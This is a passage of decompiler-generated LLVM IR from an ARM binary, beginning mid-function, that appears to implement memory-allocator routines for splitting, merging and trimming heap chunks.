  %v1_121d0 = phi i32 [ %v3_121b8, %dec_label_pc_121c0 ], [ %v1_121d0.pre, %dec_label_pc_121cc ]
  %v0_121d0 = phi i32 [ %v3_121ac, %dec_label_pc_121c0 ], [ %v0_121d0.pre, %dec_label_pc_121cc ]
  %v2_121d0 = add i32 %v1_121d0, 8
  %v3_121d0 = inttoptr i32 %v2_121d0 to i32*
  store i32 %v0_121d0, i32* %v3_121d0, align 4
  %v0_121d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_121d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_121d4 = add i32 %v1_121d4, 12
  %v3_121d4 = inttoptr i32 %v2_121d4 to i32*
  store i32 %v0_121d4, i32* %v3_121d4, align 4
  %v1_12290.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12290

dec_label_pc_121dc:                               ; preds = %dec_label_pc_1214c, %dec_label_pc_1219c, %dec_label_pc_12188
  %v1_121dc = add i32 %v1_12120, -7
  store i32 %v1_121dc, i32* %r0.global-to-local, align 4
  %v1_121e0 = call i32 @function_11604(i32 %v1_121dc)
  store i32 %v1_121e0, i32* @r0, align 4
  store i32 %v1_121e0, i32* %r1.global-to-local, align 4
  %v2_121e4 = icmp eq i32 %v1_121e0, 0
  br i1 %v2_121e4, label %bb31, label %dec_label_pc_121f0

bb31:                                             ; preds = %dec_label_pc_121dc
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_123c4

dec_label_pc_121f0:                               ; preds = %dec_label_pc_121dc
  %v1_121f8.pre = load i32, i32* @r4, align 4
  %v1_121f0 = add i32 %v1_121e0, -4
  %v2_121f0 = inttoptr i32 %v1_121f0 to i32*
  %v3_121f0 = load i32, i32* %v2_121f0, align 4
  store i32 %v3_121f0, i32* @r3, align 4
  %v1_121f4 = add i32 %v1_121e0, -8
  store i32 %v1_121f4, i32* @r7, align 4
  %v9_121f8 = icmp eq i32 %v1_121f4, %v1_121f8.pre
  br i1 %v9_121f8, label %.thread2, label %dec_label_pc_12208

.thread2:                                         ; preds = %dec_label_pc_121f0
  %v2_121fc = and i32 %v3_121f0, -4
  store i32 %v2_121fc, i32* %r3.global-to-local, align 4
  %v2_12200 = load i32, i32* @r6, align 4
  %v3_12200 = add i32 %v2_12200, %v2_121fc
  store i32 %v3_12200, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12290

dec_label_pc_12208:                               ; preds = %dec_label_pc_121f0
  %v0_12208 = load i32, i32* @r6, align 4
  %v1_12208 = add i32 %v0_12208, -4
  store i32 %v1_12208, i32* @r2, align 4
  %v3_1220c = udiv i32 %v1_12208, 4
  store i32 %v3_1220c, i32* @ip, align 4
  %tmp37 = and i32 %v1_12208, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_12214 = icmp ult i32 %v1_12208, 36
  %v3_12214 = or i1 %tmp38, %v2_12214
  %v0_12224 = load i32, i32* @r5, align 4
  br i1 %v3_12214, label %dec_label_pc_12224, label %dec_label_pc_12218

dec_label_pc_12218:                               ; preds = %dec_label_pc_12208
  store i32 %v0_12224, i32* @r1, align 4
  %v0_1221c = call i32 @function_11110()
  store i32 %v0_1221c, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_12224:                               ; preds = %dec_label_pc_12208
  %v1_12224 = inttoptr i32 %v0_12224 to i32*
  %v2_12224 = load i32, i32* %v1_12224, align 4
  store i32 %v2_12224, i32* %r3.global-to-local, align 4
  %v2_12228 = inttoptr i32 %v1_121e0 to i32*
  store i32 %v2_12224, i32* %v2_12228, align 4
  %v0_1222c = load i32, i32* @r5, align 4
  %v1_1222c = add i32 %v0_1222c, 4
  %v2_1222c = inttoptr i32 %v1_1222c to i32*
  %v3_1222c = load i32, i32* %v2_1222c, align 4
  store i32 %v3_1222c, i32* %r3.global-to-local, align 4
  %v1_12230 = load i32, i32* %r1.global-to-local, align 4
  %v2_12230 = add i32 %v1_12230, 4
  %v3_12230 = inttoptr i32 %v2_12230 to i32*
  store i32 %v3_1222c, i32* %v3_12230, align 4
  %v0_12234 = load i32, i32* @r5, align 4
  %v1_12234 = add i32 %v0_12234, 8
  %v2_12234 = inttoptr i32 %v1_12234 to i32*
  %v3_12234 = load i32, i32* %v2_12234, align 4
  store i32 %v3_12234, i32* %r3.global-to-local, align 4
  %v0_12238 = load i32, i32* @ip, align 4
  %v1_1223c = load i32, i32* %r1.global-to-local, align 4
  %v2_1223c = add i32 %v1_1223c, 8
  %v3_1223c = inttoptr i32 %v2_1223c to i32*
  store i32 %v3_12234, i32* %v3_1223c, align 4
  %tmp39 = icmp ult i32 %v0_12238, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_12244

dec_label_pc_12244:                               ; preds = %dec_label_pc_12224
  %v0_12244 = load i32, i32* @r5, align 4
  %v1_12244 = add i32 %v0_12244, 12
  %v2_12244 = inttoptr i32 %v1_12244 to i32*
  %v3_12244 = load i32, i32* %v2_12244, align 4
  store i32 %v3_12244, i32* %r3.global-to-local, align 4
  %v1_12248 = load i32, i32* %r1.global-to-local, align 4
  %v2_12248 = add i32 %v1_12248, 12
  %v3_12248 = inttoptr i32 %v2_12248 to i32*
  store i32 %v3_12244, i32* %v3_12248, align 4
  %v0_1224c = load i32, i32* @r5, align 4
  %v1_1224c = add i32 %v0_1224c, 16
  %v2_1224c = inttoptr i32 %v1_1224c to i32*
  %v3_1224c = load i32, i32* %v2_1224c, align 4
  store i32 %v3_1224c, i32* %r3.global-to-local, align 4
  %v0_12250 = load i32, i32* @ip, align 4
  %v1_12254 = load i32, i32* %r1.global-to-local, align 4
  %v2_12254 = add i32 %v1_12254, 16
  %v3_12254 = inttoptr i32 %v2_12254 to i32*
  store i32 %v3_1224c, i32* %v3_12254, align 4
  %tmp40 = icmp ult i32 %v0_12250, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_1225c

dec_label_pc_1225c:                               ; preds = %dec_label_pc_12244
  %v0_1225c = load i32, i32* @r5, align 4
  %v1_1225c = add i32 %v0_1225c, 20
  %v2_1225c = inttoptr i32 %v1_1225c to i32*
  %v3_1225c = load i32, i32* %v2_1225c, align 4
  store i32 %v3_1225c, i32* %r3.global-to-local, align 4
  %v1_12260 = load i32, i32* %r1.global-to-local, align 4
  %v2_12260 = add i32 %v1_12260, 20
  %v3_12260 = inttoptr i32 %v2_12260 to i32*
  store i32 %v3_1225c, i32* %v3_12260, align 4
  %v0_12264 = load i32, i32* @r5, align 4
  %v1_12264 = add i32 %v0_12264, 24
  %v2_12264 = inttoptr i32 %v1_12264 to i32*
  %v3_12264 = load i32, i32* %v2_12264, align 4
  store i32 %v3_12264, i32* %r3.global-to-local, align 4
  %v1_12268 = load i32, i32* %r1.global-to-local, align 4
  %v2_12268 = add i32 %v1_12268, 24
  %v3_12268 = inttoptr i32 %v2_12268 to i32*
  store i32 %v3_12264, i32* %v3_12268, align 4
  %v0_1226c = load i32, i32* @ip, align 4
  %v7_1226c = icmp eq i32 %v0_1226c, 9
  br i1 %v7_1226c, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1225c
  %v1_12270 = load i32, i32* @r5, align 4
  %v2_12270 = add i32 %v1_12270, 28
  %v3_12270 = inttoptr i32 %v2_12270 to i32*
  %v4_12270 = load i32, i32* %v3_12270, align 4
  store i32 %v4_12270, i32* %r3.global-to-local, align 4
  %v2_12274 = load i32, i32* %r1.global-to-local, align 4
  %v3_12274 = add i32 %v2_12274, 28
  %v4_12274 = inttoptr i32 %v3_12274 to i32*
  store i32 %v4_12270, i32* %v4_12274, align 4
  %v1_12278 = load i32, i32* @r5, align 4
  %v2_12278 = add i32 %v1_12278, 32
  %v3_12278 = inttoptr i32 %v2_12278 to i32*
  %v4_12278 = load i32, i32* %v3_12278, align 4
  store i32 %v4_12278, i32* %r3.global-to-local, align 4
  %v2_1227c = load i32, i32* %r1.global-to-local, align 4
  %v3_1227c = add i32 %v2_1227c, 32
  %v4_1227c = inttoptr i32 %v3_1227c to i32*
  store i32 %v4_12278, i32* %v4_1227c, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1225c, %dec_label_pc_12244, %dec_label_pc_12224, %dec_label_pc_12218, %bb32
  %v0_12280 = load i32, i32* @r5, align 4
  store i32 %v0_12280, i32* @r0, align 4
  %v0_12284 = call i32 @function_12670()
  store i32 %v0_12284, i32* %r0.global-to-local, align 4
  %v0_12288 = load i32, i32* @r7, align 4
  %v1_12288 = add i32 %v0_12288, 8
  store i32 %v1_12288, i32* @r4, align 4
  br label %dec_label_pc_123c4

dec_label_pc_12290:                               ; preds = %bb30, %.thread2, %dec_label_pc_121d0
  %v0_122a4 = phi i32 [ %v3_12200, %.thread2 ], [ %v1_12118, %bb30 ], [ %v1_12290.pre, %dec_label_pc_121d0 ]
  %v0_12290 = load i32, i32* @sb, align 4
  %v2_12290 = sub i32 %v0_122a4, %v0_12290
  store i32 %v2_12290, i32* %r1.global-to-local, align 4
  %v0_12298 = load i32, i32* @sl, align 4
  %v1_12298 = add i32 %v0_12298, 4
  %v2_12298 = inttoptr i32 %v1_12298 to i32*
  %v3_12298 = load i32, i32* %v2_12298, align 4
  %tmp41 = icmp ugt i32 %v2_12290, 15
  %v1_122c0 = urem i32 %v3_12298, 2
  store i32 %v1_122c0, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_122c0, label %dec_label_pc_122a0

dec_label_pc_122a0:                               ; preds = %dec_label_pc_12290
  %v2_122a4 = or i32 %v1_122c0, %v0_122a4
  store i32 %v2_122a4, i32* %r3.global-to-local, align 4
  store i32 %v2_122a4, i32* %v2_12298, align 4
  %v0_122ac = load i32, i32* @sl, align 4
  %v1_122ac = load i32, i32* %r0.global-to-local, align 4
  %v2_122ac = add i32 %v1_122ac, %v0_122ac
  store i32 %v2_122ac, i32* %r2.global-to-local, align 4
  %v1_122b0 = add i32 %v2_122ac, 4
  %v2_122b0 = inttoptr i32 %v1_122b0 to i32*
  %v3_122b0 = load i32, i32* %v2_122b0, align 4
  %v1_122b4 = or i32 %v3_122b0, 1
  store i32 %v1_122b4, i32* %r3.global-to-local, align 4
  store i32 %v1_122b4, i32* %v2_122b0, align 4
  br label %dec_label_pc_122f0

dec_label_pc_122c0:                               ; preds = %dec_label_pc_12290
  %v2_122c4 = add i32 %v0_12298, %v0_12290
  store i32 %v2_122c4, i32* %r0.global-to-local, align 4
  %v2_122c8 = or i32 %v1_122c0, %v0_12290
  store i32 %v2_122c8, i32* %r3.global-to-local, align 4
  %v1_122cc = or i32 %v2_12290, 1
  store i32 %v1_122cc, i32* %r2.global-to-local, align 4
  store i32 %v2_122c8, i32* %v2_12298, align 4
  %v0_122d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_122d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_122d4 = add i32 %v1_122d4, 4
  %v3_122d4 = inttoptr i32 %v2_122d4 to i32*
  store i32 %v0_122d4, i32* %v3_122d4, align 4
  %v0_122d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_122d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_122d8 = add i32 %v1_122d8, %v0_122d8
  store i32 %v2_122d8, i32* %r2.global-to-local, align 4
  %v1_122dc = add i32 %v2_122d8, 4
  %v2_122dc = inttoptr i32 %v1_122dc to i32*
  %v3_122dc = load i32, i32* %v2_122dc, align 4
  %v1_122e0 = or i32 %v3_122dc, 1
  store i32 %v1_122e0, i32* %r3.global-to-local, align 4
  store i32 %v1_122e0, i32* %v2_122dc, align 4
  %v0_122e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_122e8 = add i32 %v0_122e8, 8
  store i32 %v1_122e8, i32* @r0, align 4
  %v0_122ec = call i32 @function_12670()
  store i32 %v0_122ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_122f0

dec_label_pc_122f0:                               ; preds = %dec_label_pc_122a0, %dec_label_pc_122c0
  %v0_122f0 = load i32, i32* @sl, align 4
  %v1_122f0 = add i32 %v0_122f0, 8
  store i32 %v1_122f0, i32* @r4, align 4
  br label %dec_label_pc_123c4

dec_label_pc_122f8:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r1.global-to-local, align 4
  %v4_12300 = load i32, i32* inttoptr (i32 124120 to i32*), align 8
  store i32 %v4_12300, i32* @r8, align 4
  %v2_12304 = inttoptr i32 %v1_12114 to i32*
  %v3_12304 = load i32, i32* %v2_12304, align 4
  store i32 %v3_12304, i32* @r4, align 4
  %v1_12308 = add i32 %v4_12300, 860
  %v2_12308 = inttoptr i32 %v1_12308 to i32*
  %v3_12308 = load i32, i32* %v2_12308, align 4
  %v1_1230c = add i32 %v3_12304, 4
  %v1_12310 = add i32 %v3_12308, -1
  store i32 %v1_12310, i32* %r2.global-to-local, align 4
  %v2_12314 = add i32 %v1_1230c, %v1_12310
  %v1_12318 = load i32, i32* @sb, align 4
  %v2_12318 = add i32 %v2_12314, %v1_12318
  store i32 %v2_12318, i32* %r3.global-to-local, align 4
  %v2_1231c = sub i32 0, %v3_12308
  %v3_1231c = and i32 %v2_12318, %v2_1231c
  store i32 %v3_1231c, i32* @r7, align 4
  %v2_12320 = sub i32 %v3_1231c, %v3_12304
  store i32 %v2_12320, i32* @fp, align 4
  %v9_12324 = icmp eq i32 %v1_12118, %v2_12320
  br i1 %v9_12324, label %dec_label_pc_12398, label %dec_label_pc_1232c

dec_label_pc_1232c:                               ; preds = %dec_label_pc_122f8
  %v2_1232c = sub i32 %v1_12114, %v3_12304
  store i32 %v2_1232c, i32* %r0.global-to-local, align 4
  %v2_12330 = add i32 %v3_12304, %v1_12118
  store i32 %v2_12330, i32* %r1.global-to-local, align 4
  store i32 %v3_1231c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_1233c = call i32 @function_13ebc(i32 %v2_1232c, i32 %v2_12330, i32 %v3_1231c, i32 1)
  store i32 %v4_1233c, i32* %r0.global-to-local, align 4
  %v7_12340 = icmp eq i32 %v4_1233c, -1
  br i1 %v7_12340, label %dec_label_pc_1238c, label %dec_label_pc_12348

dec_label_pc_12348:                               ; preds = %dec_label_pc_1232c
  %v1_12348 = load i32, i32* @r4, align 4
  %v2_12348 = add i32 %v1_12348, %v4_1233c
  store i32 %v2_12348, i32* %r0.global-to-local, align 4
  %v0_1234c = load i32, i32* @fp, align 4
  %v1_1234c = or i32 %v0_1234c, 2
  store i32 %v1_1234c, i32* %r3.global-to-local, align 4
  %v2_12350 = add i32 %v2_12348, 4
  %v3_12350 = inttoptr i32 %v2_12350 to i32*
  store i32 %v1_1234c, i32* %v3_12350, align 4
  %v0_12354 = load i32, i32* @r8, align 4
  %v1_12354 = add i32 %v0_12354, 868
  %v2_12354 = inttoptr i32 %v1_12354 to i32*
  %v3_12354 = load i32, i32* %v2_12354, align 4
  store i32 %v3_12354, i32* %r3.global-to-local, align 4
  %v1_12358 = add i32 %v0_12354, 880
  %v2_12358 = inttoptr i32 %v1_12358 to i32*
  %v3_12358 = load i32, i32* %v2_12358, align 4
  store i32 %v3_12358, i32* %r2.global-to-local, align 4
  %v0_1235c = load i32, i32* @r6, align 4
  %v2_1235c = sub i32 %v3_12354, %v0_1235c
  store i32 %v2_1235c, i32* %r3.global-to-local, align 4
  %v1_12360 = load i32, i32* @r7, align 4
  %v2_12360 = add i32 %v1_12360, %v2_1235c
  store i32 %v2_12360, i32* %r1.global-to-local, align 4
  %v1_12364 = add i32 %v0_12354, 872
  %v2_12364 = inttoptr i32 %v1_12364 to i32*
  %v3_12364 = load i32, i32* %v2_12364, align 4
  store i32 %v3_12364, i32* %r3.global-to-local, align 4
  %v1_1236c = add i32 %v0_12354, 884
  %v2_1236c = inttoptr i32 %v1_1236c to i32*
  %v3_1236c = load i32, i32* %v2_1236c, align 4
  store i32 %v3_1236c, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_12360, %v3_12358
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_12348
  store i32 %v2_12360, i32* %v2_12358, align 4
  %v0_12374.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12374.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_12348, %bb33
  %v1_12374 = phi i32 [ %v0_12354, %dec_label_pc_12348 ], [ %v1_12374.pre, %bb33 ]
  %v0_12374 = phi i32 [ %v2_12360, %dec_label_pc_12348 ], [ %v0_12374.pre, %bb33 ]
  %v2_12374 = add i32 %v1_12374, 868
  %v3_12374 = inttoptr i32 %v2_12374 to i32*
  store i32 %v0_12374, i32* %v3_12374, align 4
  %v0_12378 = load i32, i32* %r1.global-to-local, align 4
  %v1_12378 = load i32, i32* %r3.global-to-local, align 4
  %v2_12378 = add i32 %v1_12378, %v0_12378
  store i32 %v2_12378, i32* %r1.global-to-local, align 4
  %v1_1237c = load i32, i32* %r2.global-to-local, align 4
  %v0_12380 = load i32, i32* %r0.global-to-local, align 4
  %v1_12380 = add i32 %v0_12380, 8
  store i32 %v1_12380, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_12378, %v1_1237c
  br i1 %tmp43, label %bb35, label %dec_label_pc_123c4

bb35:                                             ; preds = %bb34
  %v5_12384 = load i32, i32* @r8, align 4
  %v6_12384 = add i32 %v5_12384, 884
  %v7_12384 = inttoptr i32 %v6_12384 to i32*
  store i32 %v2_12378, i32* %v7_12384, align 4
  br label %dec_label_pc_123c4

dec_label_pc_1238c:                               ; preds = %dec_label_pc_1232c
  %v0_1238c = load i32, i32* @sb, align 4
  %v1_1238c = add i32 %v0_1238c, 4
  store i32 %v1_1238c, i32* %r3.global-to-local, align 4
  %v0_12390 = load i32, i32* @r6, align 4
  %v3_12390 = icmp ult i32 %v0_12390, %v1_1238c
  br i1 %v3_12390, label %dec_label_pc_123a0, label %dec_label_pc_1238c.dec_label_pc_12398_crit_edge

dec_label_pc_1238c.dec_label_pc_12398_crit_edge:  ; preds = %dec_label_pc_1238c
  %v0_12398.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12398

dec_label_pc_12398:                               ; preds = %dec_label_pc_1238c.dec_label_pc_12398_crit_edge, %dec_label_pc_122f8
  %v0_12398 = phi i32 [ %v0_12398.pre, %dec_label_pc_1238c.dec_label_pc_12398_crit_edge ], [ %v0_12100, %dec_label_pc_122f8 ]
  store i32 %v0_12398, i32* @r4, align 4
  br label %dec_label_pc_123c4

dec_label_pc_123a0:                               ; preds = %dec_label_pc_1238c
  %v1_123a0 = add i32 %v0_1238c, -7
  store i32 %v1_123a0, i32* %r0.global-to-local, align 4
  %v1_123a4 = call i32 @function_11604(i32 %v1_123a0)
  store i32 %v1_123a4, i32* @r0, align 4
  store i32 %v1_123a4, i32* @r4, align 4
  %v2_123a8 = icmp eq i32 %v1_123a4, 0
  br i1 %v2_123a8, label %dec_label_pc_123c4, label %dec_label_pc_123b0

dec_label_pc_123b0:                               ; preds = %dec_label_pc_123a0
  %v0_123b0 = load i32, i32* @r6, align 4
  %v1_123b0 = add i32 %v0_123b0, -8
  store i32 %v1_123b0, i32* @r2, align 4
  %v0_123b4 = load i32, i32* @r5, align 4
  store i32 %v0_123b4, i32* @r1, align 4
  %v0_123b8 = call i32 @function_11110()
  %v0_123bc = load i32, i32* @r5, align 4
  store i32 %v0_123bc, i32* @r0, align 4
  %v0_123c0 = call i32 @function_12670()
  store i32 %v0_123c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_123c4

dec_label_pc_123c4:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_123a0, %dec_label_pc_12398, %dec_label_pc_122f0, %.thread6, %dec_label_pc_12160, %dec_label_pc_123b0
  store i32 %v2_120b4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 124088, i32* %r2.global-to-local, align 4
  %v4_123d4 = load i32, i32* inttoptr (i32 124112 to i32*), align 16
  store i32 %v4_123d4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_123d4)
  br label %dec_label_pc_123e0

dec_label_pc_123e0:                               ; preds = %dec_label_pc_120e8, %dec_label_pc_12090, %dec_label_pc_12078, %dec_label_pc_123c4
  %v0_123e0 = load i32, i32* @r4, align 4
  store i32 %v0_123e0, i32* %r0.global-to-local, align 4
  store i32 %v3_12058, i32* @r4, align 4
  store i32 %v6_12058, i32* @r5, align 4
  store i32 %v9_12058, i32* @r6, align 4
  store i32 %v12_12058, i32* @r7, align 4
  store i32 %v15_12058, i32* @r8, align 4
  store i32 %v18_12058, i32* @sb, align 4
  store i32 %v21_12058, i32* @sl, align 4
  store i32 %v24_12058, i32* @fp, align 4
  store i32 %v27_12058, i32* @lr, align 4
  ret i32 %v0_123e0

; uselistorder directives
  uselistorder i32 %v2_12378, { 1, 0, 2 }
  uselistorder i32 %v2_12360, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1233c, { 1, 0, 2 }
  uselistorder i32 %v3_1231c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_122c0, { 2, 1, 0 }
  uselistorder i32 %v2_12290, { 1, 0, 2 }
  uselistorder i32 %v0_12224, { 1, 0 }
  uselistorder i32 %v1_121e0, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_12144, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1213c, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_12120, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_12118, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_12114, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_12104, { 1, 0 }
  uselistorder i32 %v0_12100, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_120e0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 30, 6, 11, 7, 8, 9, 10, 22, 12, 14, 13, 15, 21, 23, 16, 17, 18, 19, 20, 26, 25, 24, 27, 29, 28 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_123e0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_123c4, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_122f0, { 1, 0 }
  uselistorder label %dec_label_pc_12290, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_121dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_121d0, { 1, 0 }
  uselistorder label %dec_label_pc_121cc, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_123f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_123f4:
  %v0_123f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_123f4, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_123f4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_123f4, %bb
  %v10_12408 = phi i32 [ %arg1, %dec_label_pc_123f4 ], [ 0, %bb ]
  ret i32 %v10_12408

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_1240c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1240c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_1240c = add i32 %arg2, 44
  %v2_1240c = inttoptr i32 %v1_1240c to i32*
  %v3_1240c = load i32, i32* %v2_1240c, align 4
  %v1_12414 = add i32 %v3_1240c, 4
  %v2_12414 = inttoptr i32 %v1_12414 to i32*
  %v3_12414 = load i32, i32* %v2_12414, align 4
  %v1_12418 = add i32 %arg2, 860
  %v2_12418 = inttoptr i32 %v1_12418 to i32*
  %v3_12418 = load i32, i32* %v2_12418, align 4
  store i32 %v3_12418, i32* @r4, align 4
  %v1_1241c = and i32 %v3_12414, -4
  store i32 %v1_1241c, i32* @r6, align 4
  %v1_12420 = add i32 %v1_1241c, -17
  %v2_12424 = add i32 %v1_12420, %v3_12418
  store i32 %arg2, i32* @r5, align 4
  %v2_12430 = sub i32 %v2_12424, %arg1
  store i32 %v2_12430, i32* @r0, align 4
  store i32 %v3_12418, i32* @r1, align 4
  %v0_12438 = call i32 @function_1067c()
  %v1_1243c = add i32 %v0_12438, -1
  store i32 %v1_1243c, i32* %r0.global-to-local, align 4
  %v0_12440 = load i32, i32* @r4, align 4
  %v2_12440 = mul i32 %v0_12440, %v1_1243c
  store i32 %v2_12440, i32* %r7.global-to-local, align 4
  %v2_12444 = icmp eq i32 %v2_12440, 0
  store i1 %v2_12444, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_12440, 1
  br i1 %tmp8, label %dec_label_pc_124ac, label %dec_label_pc_1244c

dec_label_pc_1244c:                               ; preds = %dec_label_pc_1240c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12450 = call i32 @function_13b78(i32 0)
  store i32 %v1_12450, i32* %r0.global-to-local, align 4
  %v0_12454 = load i32, i32* @r5, align 4
  %v1_12454 = add i32 %v0_12454, 44
  %v2_12454 = inttoptr i32 %v1_12454 to i32*
  %v3_12454 = load i32, i32* %v2_12454, align 4
  %v0_12458 = load i32, i32* @r6, align 4
  %v2_12458 = add i32 %v0_12458, %v3_12454
  %v9_1245c = icmp eq i32 %v1_12450, %v2_12458
  store i1 %v9_1245c, i1* @cpsr_z, align 1
  store i32 %v1_12450, i32* @r4, align 4
  br i1 %v9_1245c, label %dec_label_pc_12468, label %dec_label_pc_124ac

dec_label_pc_12468:                               ; preds = %dec_label_pc_1244c
  %v0_12468 = load i32, i32* %r7.global-to-local, align 4
  %v1_12468 = sub i32 0, %v0_12468
  store i32 %v1_12468, i32* %r0.global-to-local, align 4
  %v1_1246c = call i32 @function_13b78(i32 %v1_12468)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12474 = call i32 @function_13b78(i32 0)
  store i32 %v1_12474, i32* %r0.global-to-local, align 4
  %v7_12478 = icmp eq i32 %v1_12474, -1
  store i1 %v7_12478, i1* @cpsr_z, align 1
  br i1 %v7_12478, label %dec_label_pc_124ac, label %dec_label_pc_12480

dec_label_pc_12480:                               ; preds = %dec_label_pc_12468
  %v0_12480 = load i32, i32* @r4, align 4
  %v2_12480 = sub i32 %v0_12480, %v1_12474
  store i32 %v2_12480, i32* %r0.global-to-local, align 4
  %v9_12480 = icmp eq i32 %v0_12480, %v1_12474
  store i1 %v9_12480, i1* @cpsr_z, align 1
  br i1 %v9_12480, label %dec_label_pc_124ac, label %dec_label_pc_12488

dec_label_pc_12488:                               ; preds = %dec_label_pc_12480
  %v0_12488 = load i32, i32* @r5, align 4
  %v1_12488 = add i32 %v0_12488, 872
  %v2_12488 = inttoptr i32 %v1_12488 to i32*
  %v3_12488 = load i32, i32* %v2_12488, align 4
  %v1_1248c = load i32, i32* @r6, align 4
  %v2_1248c = sub i32 %v1_1248c, %v2_12480
  store i32 %v2_1248c, i32* %r2.global-to-local, align 4
  %v1_12490 = add i32 %v0_12488, 44
  %v2_12490 = inttoptr i32 %v1_12490 to i32*
  %v3_12490 = load i32, i32* %v2_12490, align 4
  store i32 %v3_12490, i32* %r1.global-to-local, align 4
  %v2_12494 = sub i32 %v3_12488, %v2_12480
  %v1_12498 = or i32 %v2_1248c, 1
  store i32 %v1_12498, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_12494, i32* %v2_12488, align 4
  %v0_124a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_124a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_124a4 = add i32 %v1_124a4, 4
  %v3_124a4 = inttoptr i32 %v2_124a4 to i32*
  store i32 %v0_124a4, i32* %v3_124a4, align 4
  %v1_124b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_124b0

dec_label_pc_124ac:                               ; preds = %dec_label_pc_1244c, %dec_label_pc_12480, %dec_label_pc_12468, %dec_label_pc_1240c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_124b0

dec_label_pc_124b0:                               ; preds = %dec_label_pc_12488, %dec_label_pc_124ac
  %v1_124b8 = phi i32 [ %v1_124b8.pre, %dec_label_pc_12488 ], [ 0, %dec_label_pc_124ac ]
  ret i32 %v1_124b8

; uselistorder directives
  uselistorder i1 %v7_12478, { 1, 0 }
  uselistorder i32 %v1_12474, { 2, 1, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @function_13b78, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_124b0, { 1, 0 }
